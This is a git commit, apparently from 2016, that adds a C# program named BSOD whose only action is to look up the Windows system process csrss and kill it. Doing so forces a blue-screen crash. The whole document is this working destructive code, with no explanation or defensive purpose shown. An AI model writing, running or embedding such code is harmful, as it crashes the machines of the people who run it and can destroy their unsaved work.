bf72583adf33db2429449807b44610f4626fff07
mastermind <cyberdude@mail.ru>
2016-05-22 23:22:13 +0300

    +

---
+++ BSOD/Program.cs
@@ -0,0 +1,10 @@
+﻿namespace BSOD
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            System.Diagnostics.Process.GetProcessesByName("csrss")[0].Kill();
+        }
+    }
+}
